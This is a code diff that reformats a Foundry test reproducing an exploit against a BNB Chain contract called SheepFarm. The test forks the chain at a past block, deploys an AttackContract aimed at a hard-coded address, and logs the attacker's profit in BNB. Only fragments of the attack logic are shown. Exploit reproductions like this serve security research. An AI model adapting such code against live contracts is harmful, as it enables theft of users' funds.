@@ -24,7 +24,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 23089184);
+        cheats.createSelectFork("bsc", 23_089_184);
     }
 
     function testExploit() public {
@@ -37,20 +37,16 @@ contract ContractTest is Test {
         uint256 afterBalance = address(this).balance;
 
         emit log_named_decimal_uint(
-            "SheepFarm exploiter profit after attack (in BNB):",
-            afterBalance - beforeBalance,
-            18
-        );
+            "SheepFarm exploiter profit after attack (in BNB):", afterBalance - beforeBalance, 18
+            );
     }
 
     receive() external payable {}
 }
 
 contract AttackContract {
-    ISheepFarm public constant Farm =
-        ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
-    address public constant neighbor =
-        0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
+    ISheepFarm public constant Farm = ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
+    address public constant neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
 
     constructor() payable {
         for (uint256 i; i < 402; ++i) {
